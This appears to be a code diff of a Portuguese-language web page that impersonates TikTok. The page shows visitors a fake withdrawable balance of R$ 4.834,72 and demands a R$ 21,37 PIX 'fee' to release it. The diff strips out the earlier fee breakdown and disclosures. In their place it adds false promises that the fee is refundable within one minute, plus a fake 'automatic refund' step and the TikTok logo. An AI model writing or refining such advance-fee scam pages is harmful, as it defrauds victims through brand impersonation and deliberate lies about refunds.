@@ -1097,6 +1097,246 @@
       background: var(--success);
     }
 
+    .fee-screen {
+      min-height: calc(100vh - 48px);
+      padding: 0 8px 20px;
+      background: #fff;
+    }
+
+    .fee-brand {
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 54px;
+      margin: -8px -10px 0;
+      background: #fff;
+    }
+
+    .fee-logo {
+      width: 56px;
+      height: auto;
+      object-fit: contain;
+    }
+
+    .fee-back {
+      left: 8px;
+      color: #111216;
+      display: none;
+    }
+
+    .fee-brand .timer,
+    .fee-screen .step-banner,
+    .screen-only {
+      display: none;
+    }
+
+    .fee-screen .confirm-balance,
+    .fee-screen .security-block,
+    .fee-screen .data-card,
+    .fee-screen .process-card {
+      margin-bottom: 18px;
+      border-radius: 6px;
+      box-shadow: none;
+    }
+
+    .fee-screen .confirm-balance {
+      padding: 18px 20px;
+      border: 0;
+      background: linear-gradient(135deg, #050506 0%, #171719 100%);
+      color: #fff;
+    }
+
+    .fee-screen .confirm-balance span {
+      color: #fff;
+      font-size: 12px;
+      font-weight: 900;
+      text-transform: uppercase;
+    }
+
+    .fee-screen .confirm-balance strong {
+      margin-top: 6px;
+      color: #fff;
+      font-size: 27px;
+      line-height: 1;
+      letter-spacing: 0;
+    }
+
+    .fee-screen .confirm-balance small {
+      margin-top: 8px;
+      color: #fff;
+      font-size: 11px;
+      font-weight: 800;
+    }
+
+    .fee-screen .security-block,
+    .fee-screen .data-card,
+    .fee-screen .process-card {
+      padding: 18px 20px;
+      border: 1px solid #e8e8ec;
+      background: #fff;
+    }
+
+    .fee-screen .security-title,
+    .fee-screen .data-title,
+    .fee-screen .process-title {
+      margin-bottom: 12px;
+      color: #9a9ca5;
+      font-size: 12px;
+      line-height: 1.2;
+      letter-spacing: 0;
+    }
+
+    .fee-screen .security-amount {
+      gap: 9px;
+      margin-bottom: 13px;
+      align-items: baseline;
+    }
+
+    .fee-screen .security-amount strong {
+      color: #e8547a;
+      font-size: 24px;
+      line-height: 1;
+    }
+
+    .fee-screen .badge {
+      padding: 0;
+      border-radius: 0;
+      background: transparent;
+      color: #49c590;
+      font-size: 10px;
+      text-decoration: underline;
+    }
+
+    .fee-screen .security-copy {
+      color: #777a84;
+      font-size: 12px;
+      line-height: 1.35;
+      font-weight: 700;
+    }
+
+    .fee-screen .security-copy strong {
+      color: #565963;
+      font-weight: 900;
+    }
+
+    .fee-screen .pix-action {
+      display: block;
+      margin-top: 14px;
+    }
+
+    .fee-screen .pix-result-title {
+      color: #42454f;
+      font-size: 12px;
+      text-transform: uppercase;
+    }
+
+    .fee-screen .pix-result {
+      margin-top: 12px;
+    }
+
+    .fee-screen .pix-qr-wrap {
+      max-width: 178px;
+      margin-bottom: 10px;
+      padding: 8px;
+      border-radius: 6px;
+    }
+
+    .fee-screen .pix-qr-wrap img {
+      width: 158px;
+      height: 158px;
+    }
+
+    .fee-screen .pix-code {
+      min-height: 76px;
+      font-size: 12px;
+      background: #f8f8fa;
+    }
+
+    .fee-screen .copy-pix {
+      min-height: 42px;
+      border-radius: 6px;
+      background: #121214;
+      box-shadow: none;
+      font-size: 12px;
+    }
+
+    .fee-screen .data-card {
+      padding-bottom: 20px;
+    }
+
+    .fee-screen .data-row {
+      min-height: 36px;
+      padding: 0;
+      border-color: #ededf1;
+      color: #9a9ca5;
+      font-size: 11px;
+      font-weight: 800;
+    }
+
+    .fee-screen .data-row strong {
+      max-width: 64%;
+      color: #333640;
+      font-size: 11px;
+      text-align: right;
+      overflow-wrap: anywhere;
+    }
+
+    .refund-mail {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 42px;
+      margin-top: 18px;
+      border: 1px solid #eeeeef;
+      border-radius: 4px;
+      background: #fafafa;
+      color: #777a84;
+      font-size: 11px;
+      font-weight: 800;
+    }
+
+    .fee-screen .process-card {
+      padding-bottom: 8px;
+    }
+
+    .fee-screen .process-row {
+      gap: 12px;
+      min-height: 54px;
+      padding: 0 0 12px;
+      border-bottom: 0;
+      align-items: flex-start;
+    }
+
+    .fee-screen .process-index {
+      width: 28px;
+      height: 28px;
+      border-radius: 4px;
+      background: #fff0f4;
+      color: #ef7e99;
+      font-size: 12px;
+    }
+
+    .fee-screen .process-row.done .process-index {
+      background: #ecfbf4;
+      color: #4fc28d;
+    }
+
+    .fee-screen .process-row p {
+      padding-top: 1px;
+      color: #555863;
+      font-size: 13px;
+      line-height: 1.25;
+      font-weight: 900;
+    }
+
+    .fee-screen .process-row small {
+      margin-top: 2px;
+      color: #8f929b;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
     .trust-logos {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -1577,72 +1817,40 @@
       </form>
     </section>
 
-    <section class="screen confirm-screen" id="confirm-screen" hidden>
-      <header class="confirm-header">
-        <button class="back-button" id="back-withdraw" type="button" aria-label="Voltar">
+    <section class="screen confirm-screen fee-screen" id="confirm-screen" hidden>
+      <header class="fee-brand" aria-label="TikTok">
+        <button class="back-button fee-back" id="back-withdraw" type="button" aria-label="Voltar">
           <svg class="icon" viewBox="0 0 24 24" aria-hidden="true">
             <path d="M15 18 9 12l6-6"></path>
           </svg>
         </button>
-        <div class="confirm-title">
-          <span>Confirmação da solicitação</span>
-          <span class="timer" id="payment-timer">Tempo restante: 5:00</span>
-        </div>
+        <img class="fee-logo" src="assets/tiktok-logo.png" alt="TikTok">
+        <span class="timer" id="payment-timer">Tempo restante: 5:00</span>
       </header>
 
       <div class="step-banner" id="step-banner">Você está a 1 passo de finalizar a solicitação</div>
 
-      <section class="confirm-balance" aria-label="Resumo do valor solicitado">
-        <span>Valor solicitado</span>
-        <strong class="js-selected-withdraw-amount">R$ 4.834,72</strong>
-        <small>Aguardando pagamento da taxa administrativa</small>
+      <section class="confirm-balance fee-balance" aria-label="Saldo disponível">
+        <span>Saldo disponível</span>
+        <strong>R$ 4.834,72</strong>
+        <small>Aguardando confirmação para saque</small>
       </section>
 
       <section class="security-block" aria-label="Taxa administrativa">
         <h2 class="security-title">Confirmação de identidade</h2>
         <div class="security-amount">
           <strong>R$ 21,37</strong>
-          <span class="badge">Taxa administrativa</span>
+          <span class="badge">Valor reembolsável</span>
         </div>
         <p class="security-copy">
-          O pagamento é referente à taxa de verificação, processamento antifraude e criação da transação PIX do pedido. O PIX abaixo cobra somente essa taxa administrativa.
-        </p>
-
-        <details class="fee-question">
-          <summary>O que está sendo pago?</summary>
-          <p class="fee-answer">
-            Você está pagando uma taxa administrativa de R$ 21,37 para validar os dados informados, processar a solicitação e gerar o registro de atendimento. Esse pagamento não é uma compra de produto físico e não altera a chave PIX cadastrada.
-          </p>
-        </details>
-
-        <div class="breakdown">
-          <div class="breakdown-row">
-            <span>Validação cadastral</span>
-            <strong>R$ 7,12</strong>
-          </div>
-          <div class="breakdown-row">
-            <span>Processamento antifraude</span>
-            <strong>R$ 7,12</strong>
-          </div>
-          <div class="breakdown-row">
-            <span>Geração da transação PIX</span>
-            <strong>R$ 7,13</strong>
-          </div>
-          <div class="breakdown-row total">
-            <span>Total da taxa</span>
-            <strong>R$ 21,37</strong>
-          </div>
-        </div>
-
-        <p class="legal-copy" style="margin-top: 12px;">
-          Revise os dados antes de pagar. O pagamento será processado via PIX e o comprovante deve ser guardado para acompanhamento do pedido.
+          Taxa obrigatória para liberação do saque no valor de <strong>R$ 4.834,72</strong>. O valor de <strong>R$ 21,37</strong> será reembolsado integralmente para você em 1 minuto.
         </p>
 
         <div class="pix-action">
           <p class="generate-error" id="generate-error"></p>
 
           <div class="pix-result" id="pix-result">
-            <p class="pix-result-title">Pix gerado para pagamento da taxa administrativa</p>
+            <p class="pix-result-title">Pix copia e cola</p>
             <div class="pix-qr-wrap" id="pix-qr-wrap">
               <img id="pix-qr-image" alt="QR Code PIX">
             </div>
@@ -1653,35 +1861,44 @@
         </div>
       </section>
 
-      <section class="data-card" aria-label="Dados para processamento">
-        <h2 class="data-title">Dados para processamento</h2>
+      <section class="data-card" aria-label="Dados para reembolso">
+        <h2 class="data-title">Dados para reembolso</h2>
         <div class="data-row">
           <span>Nome</span>
           <strong id="review-name">-</strong>
+        </div>
+        <div class="data-row">
+          <span>Data</span>
+          <strong>14/01/2026</strong>
         </div>
         <div class="data-row">
           <span>Chave PIX</span>
           <strong id="review-pix">-</strong>
         </div>
         <div class="data-row">
+          <span>Valor a receber</span>
+          <strong>R$ 4.834,72</strong>
+        </div>
+        <div class="refund-mail">adsasd@asdad.com</div>
+        <div class="data-row screen-only">
           <span>Valor solicitado</span>
           <strong class="js-selected-withdraw-amount">R$ 4.834,72</strong>
         </div>
       </section>
 
-      <section class="process-card" aria-label="Processo">
-        <h2 class="process-title">Processo</h2>
+      <section class="process-card" aria-label="Processo de liberação">
+        <h2 class="process-title">Processo de liberação</h2>
         <div class="process-row">
           <span class="process-index">1</span>
-          <p>Pagar taxa administrativa <small>R$ 21,37 para processamento do pedido</small></p>
+          <p>Pagar taxa de confirmação <small>R$ 21,37 para verificação de identidade</small></p>
         </div>
         <div class="process-row done">
           <span class="process-index">&check;</span>
-          <p>Receber confirmação <small>Comprovante e código PIX disponíveis após gerar</small></p>
+          <p>Receber reembolso automático <small>Valor devolvido em 1 minuto</small></p>
         </div>
         <div class="process-row">
           <span class="process-index">3</span>
-          <p>Acompanhar solicitação <small>Use seus dados cadastrados para suporte</small></p>
+          <p>Acessar saldo completo <small>R$ 4.834,72 liberado para saque</small></p>
         </div>
       </section>
 
